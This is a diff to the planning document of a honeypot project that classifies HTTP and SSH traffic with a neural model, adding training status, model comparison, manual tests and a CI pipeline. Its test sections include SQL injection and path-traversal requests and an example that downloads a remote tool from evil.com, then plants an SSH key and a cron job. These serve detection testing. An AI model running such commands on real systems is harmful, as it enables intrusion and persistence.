@@ -124,7 +124,7 @@ During training, the `TriageEncoder(input_dim=70)` sees:
 
 ---
 
-## Current State (as of 2026-09-24)
+## Current State (as of 2026-09-25)
 
 ### ✅ Completed
 1. **Ollama + Qwen model** — configured at `192.168.56.1:11434`
@@ -138,25 +138,25 @@ During training, the `TriageEncoder(input_dim=70)` sees:
 4. **MITRE annotator upgraded** — HTTP regex patterns (SQLi, XSS, scanners) added to `attack_mapping.py`
 5. **Binary pipeline verified** — `feature_merger.py` correctly flattens Ghidra/Angr JSON → 70 columns in `sessions_complete.csv`
 
+### 🔄 In Progress
+6. Neural training running on host machine
+
 ### ⬜ Not Started
-6. Run neural training
-7. Modify runtime interceptors
-8. Modify decoy integration
-9. Final integration test
+7. Model comparison & selection
+8. Manual testing with model swapping
+9. Modify runtime interceptors
+10. Modify decoy integration
+11. Final integration test
+12. CI/CD pipeline
 
 ---
 
 ## Execution Steps
 
-### Step 5: Run Neural Training (NEXT)
+### Step 5: Run Neural Training (IN PROGRESS — on host machine)
 
-```bash
-PYTHONPATH=src python3 src/training/neural/train_neural.py \
-    --data-path data/exports/sessions_complete.csv \
-    --max-length 2048 \
-    --batch-size 16 \
-    --epochs 50 \
-    --patience 5
+```cmd
+python src\training\neural\train_neural.py --batch-size 32 --epochs 100 --lr 3e-4 --weight-decay 1e-3 --patience 10
 ```
 
 **What happens**:
@@ -171,32 +171,93 @@ PYTHONPATH=src python3 src/training/neural/train_neural.py \
    - `triage`: 70-dim (real binary features for 181 sessions, static-only for 47K, zeros for rest)
    - `modality_mask`: 4 booleans `[cmd_missing, mitre_missing, changes_missing, triage_missing]`
 6. Trains `UnifiedThreatClassifier` with focal loss + class weights
-7. Early stopping on validation loss (patience=5)
-8. Saves `models/brain_v6_unified.pt`
+7. Early stopping on validation F1 (patience=10)
+8. Saves checkpoint to `checkpoints/best_model.pt` during training
+9. At the end, loads best checkpoint → runs final test evaluation → saves to `models/brain_v5_neural.pt`
 
-**GPU Memory Note**: With `max_length=2048` and `batch_size=16`, the BiLSTM processes longer sequences. If OOM on RTX 3050 (5GB), reduce `--batch-size` to 8. The BiLSTM memory scales linearly with sequence length.
+**Note**: `best_model.pt` and `brain_v5_neural.pt` contain identical weights. The trainer saves checkpoints to `best_model.pt` mid-training whenever validation F1 improves, then at the end it reloads that best checkpoint and re-saves as the final named model.
 
-**Model Output Format** (consumed by `decision.py` → deception agent):
+### Step 6: Model Comparison & Selection
 
-```python
-# UnifiedThreatClassifier.predict() returns:
-predictions: Tensor[batch]      # argmax class ids (0-5)
-probabilities: Tensor[batch, 6] # softmax probability distribution
+We have multiple trained models in `models/`. After the new unified model finishes training, we compare them all.
 
-# decision.py wraps into:
-{
-    "class_id": int,           # 0-5
-    "label": str,              # "Safe"|"Recon"|"Downloader"|"Exploit"|"Destructive"|"ADVANCED_APT"
-    "confidence": float,       # max probability
-    "action": str,             # "forward"|"forward_and_log"|"redirect_to_decoy"
-    "rule": str,               # "neural_model (confidence=95.3%)" or MITRE rule
-    "mitre_tactics": list,     # ["credential_access", "execution", ...]
-    "severity_max": float,
-    "neural_probs": dict,      # {"Safe": 0.02, "Recon": 0.05, ...}
-}
+**Existing models:**
+
+| Model | Type | Val F1 | Epochs | Architecture |
+|-------|------|--------|--------|-------------|
+| `brain_v5_neural` | BiLSTM+MITRE (old 2-modality) | 1.0 | 25 | 100-dim structured, max_length=512 |
+| `brain_v5_mitre_only` | MITRE-only | 0.953 | 21 | 21-dim MITRE features only |
+| `brain_v5_mitre_only_balanced` | MITRE-only balanced | 0.993 | 15 | 21-dim, balanced sampling |
+| `brain_v5_semantic_balanced` | Semantic labels | 0.991 | 18 | Semantic labeling mode |
+| `brain_v6_neural` | **NEW 4-modality** | TBD | TBD | 70-dim triage, max_length=2048, HTTP+SSH |
+| `brain_v6_neural_2048` | **NEW 4-modality** | TBD | TBD | 70-dim triage, max_length=2048, HTTP+SSH |
+
+
+**How to compare**: Run all models against the same test set using a comparison script:
+
+```bash
+# Compare script (to be created: src/training/neural/compare_models.py)
+PYTHONPATH=src python3 src/training/neural/compare_models.py \
+    --models models/brain_v5_neural.pt models/brain_v6_unified.pt \
+    --test-data data/exports/sessions_complete.csv
 ```
 
-### Step 6: Modify Runtime Interceptors
+The comparison script will:
+1. Load each model and run inference on the same test split
+2. Report per-class F1, precision, recall, confusion matrix
+3. Specifically test on **HTTP attack patterns** (where the old model should fail and new model should succeed)
+4. Report inference latency (ms per sample) — important for runtime
+
+**Key comparison criteria** (in priority order):
+1. **Per-class F1 on minority classes** (APT, Destructive, Downloader) — not overall accuracy
+2. **HTTP attack detection** — does it correctly classify SQLi, XSS, path traversal?
+3. **False positive rate on Safe class** — must not redirect legitimate traffic to decoys
+4. **Inference speed** — must classify within 50ms for real-time proxy use
+
+### Step 7: Manual Testing — Swapping Models at Runtime
+
+`decision.py` loads the model from a hardcoded path: `models/brain_v6_unified.pt` ([decision.py L181](file:///home/me/data/AdaptiveShield/src/agents/decision.py#L181)).
+
+**To swap and test different models manually:**
+
+```bash
+# Option 1: Rename the model file
+cp models/brain_v6_unified.pt models/brain_v6_unified_backup.pt
+cp models/brain_v5_neural.pt models/brain_v6_unified.pt
+# Now restart the Docker service → it loads the old model
+docker compose restart core
+
+# Option 2: Use a symlink (cleaner)
+cd models/
+ln -sf brain_v5_neural.pt brain_v6_unified.pt   # point to old model
+# Restart to test
+docker compose restart core
+ln -sf brain_v6_actual.pt brain_v6_unified.pt    # point to new model
+docker compose restart core
+```
+
+**Manual test commands after swapping:**
+
+```bash
+# Test 1: Safe traffic (should NOT redirect)
+curl http://127.0.0.1/index.html
+
+# Test 2: SQL injection (should → redirect_to_decoy)
+curl "http://127.0.0.1/login?user=admin'%20OR%201=1--"
+
+# Test 3: Path traversal (should → redirect_to_decoy)
+curl "http://127.0.0.1/../../etc/passwd"
+
+# Test 4: SSH recon (should → forward_and_log)
+# From SSH proxy: run `id; whoami; uname -a; cat /etc/passwd`
+
+# Test 5: SSH APT (should → redirect_to_decoy)
+# From SSH proxy: run `wget evil.com/rat; chmod +x rat; echo "ssh-rsa ..." >> ~/.ssh/authorized_keys; crontab -e`
+```
+
+Compare the `action` and `neural_probs` output between models to see which one makes better decisions.
+
+### Step 8: Modify Runtime Interceptors
 
 Files: `http_proxy.py`, `ssh_proxy.py`, `session_store.py`
 
@@ -217,7 +278,7 @@ Files: `http_proxy.py`, `ssh_proxy.py`, `session_store.py`
 
 > Old model used `drop_and_block` for Destructive/APT. New: ALL threats → decoy (only brute-force → block).
 
-### Step 7: Modify Decoy Integration
+### Step 9: Modify Decoy Integration
 
 Files: `ssh_decoy_builder.py`, `generator.py`, `orchestrator/main.py`
 
@@ -229,7 +290,7 @@ Files: `ssh_decoy_builder.py`, `generator.py`, `orchestrator/main.py`
 - `decision.get("mitre_tactics")` → craft contextual fake responses
 - Re-classifies after each interaction → adapts in real-time
 
-### Step 8: Final Integration Test
+### Step 10: Final Integration Test
 
 ```bash
 docker compose up -d --build
@@ -239,6 +300,111 @@ curl http://127.0.0.1/health
 # Test: Exploit drops binary → static triage → classification updated
 # Test: Repeated payload → cache hit → instant
 ```
+
+### Step 11: CI/CD Pipeline
+
+The current `.github/workflows/ci.yml` only runs `compileall` and a smoke import. We need a real pipeline.
+
+#### 11a: Test Suite Structure
+
+```
+tests/
+├── unit/
+│   ├── test_mitre_annotator.py      # MITRE regex patterns fire correctly
+│   ├── test_dataset.py              # ThreatDataset builds correct tensors
+│   ├── test_model_architecture.py   # Model shapes, forward pass, modality mask
+│   ├── test_command_tokenizer.py    # Char tokenizer encodes/pads correctly
+│   ├── test_change_encoder.py       # Change encoder produces 20-dim vectors
+│   └── test_decision_logic.py       # Action mapping (Safe→forward, APT→decoy)
+├── integration/
+│   ├── test_training_pipeline.py    # Load data → train 1 epoch → save → reload
+│   ├── test_inference_pipeline.py   # Load model → classify sample inputs → check outputs
+│   ├── test_http_proxy.py           # HTTP request → decision → correct action
+│   └── test_ssh_proxy.py            # SSH commands → decision → correct action
+├── regression/
+│   ├── test_known_attacks.py        # Golden test: known SQLi/XSS/APT commands → expected class
+│   └── test_model_performance.py    # Load model → run on test set → F1 must exceed threshold
+└── conftest.py                      # Shared fixtures (sample data, model loading)
+```
+
+#### 11b: CI Workflow (`.github/workflows/ci.yml`)
+
+**Triggers**: Push to `main` or `train`, all PRs  
+**Jobs**:
+
+1. **`lint`** — `ruff check src/` + `mypy src/` (fast, catches obvious bugs)
+2. **`unit-tests`** — `pytest tests/unit/ -v` (no GPU, no model files needed, ~30s)
+3. **`integration-tests`** — `pytest tests/integration/ -v` (needs model file, uses CPU, ~2min)
+4. **`regression-tests`** — `pytest tests/regression/ -v --tb=long` (loads model, runs golden attack set)
+5. **`docker-build`** — `docker compose build` (verifies Dockerfiles still work)
+
+**Model file handling in CI**: The `.pt` model file is too large for git. Options:
+- **Git LFS**: Track `models/*.pt` with LFS. CI pulls from LFS automatically.
+- **GitHub Release artifact**: Upload model to a GitHub Release. CI downloads it in a setup step.
+- **Skip model-dependent tests on PR**: Only run unit tests on PR; run full suite on merge to main.
+
+#### 11c: GitHub Actions Workflow (Updated)
+
+```yaml
+name: CI
+on:
+  push:
+    branches: [main, train]
+  pull_request:
+    branches: [main]
+
+jobs:
+  lint:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-python@v4
+        with: { python-version: '3.12' }
+      - run: pip install ruff
+      - run: ruff check src/ --select E,F,W
+
+  unit-tests:
+    runs-on: ubuntu-latest
+    needs: lint
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-python@v4
+        with: { python-version: '3.12' }
+      - run: pip install -r requirements.txt
+      - run: PYTHONPATH=src pytest tests/unit/ -v --tb=short
+
+  integration-tests:
+    runs-on: ubuntu-latest
+    needs: unit-tests
+    if: github.event_name == 'push'
+    steps:
+      - uses: actions/checkout@v4
+        with: { lfs: true }
+      - uses: actions/setup-python@v4
+        with: { python-version: '3.12' }
+      - run: pip install -r requirements.txt
+      - run: PYTHONPATH=src pytest tests/integration/ -v --tb=long
+
+  docker-build:
+    runs-on: ubuntu-latest
+    needs: lint
+    steps:
+      - uses: actions/checkout@v4
+      - run: docker compose build --no-cache
+```
+
+#### 11d: Key Test Cases (What to Assert)
+
+| Test | Input | Expected |
+|------|-------|----------|
+| MITRE: SQLi detection | `GET /login?user=admin' OR 1=1--` | tactic `initial_access`, technique `T1190` |
+| MITRE: SSH recon | `id; whoami; cat /etc/passwd` | tactic `discovery` |
+| Model: Forward pass shape | batch of 4 samples | logits shape `[4, 6]` |
+| Model: Modality mask | all-zero triage input | triage_mask = True |
+| Model: Safe classification | `ls; pwd; exit` | class 0 (Safe), confidence > 0.8 |
+| Decision: Action mapping | class=ADVANCED_APT | action=`redirect_to_decoy` |
+| Regression: Known APT | `wget c2.evil.com/rat; crontab...` | class=ADVANCED_APT, F1 > 0.85 |
+| Docker: Build succeeds | `docker compose build` | exit code 0 |
 
 ---
 
@@ -266,6 +432,9 @@ curl http://127.0.0.1/health
 | SSH Decoy Builder | `src/honeypot/ssh_decoy_builder.py` |
 | HTTP Decoy Generator | `src/honeypot/generator.py` |
 | Orchestrator | `src/orchestrator/main.py` |
+| Model Comparison | `src/training/neural/compare_models.py` (to be created) |
+| CI/CD Workflow | `.github/workflows/ci.yml` |
+| Test Suite | `tests/` (to be created) |
 
 ---
 
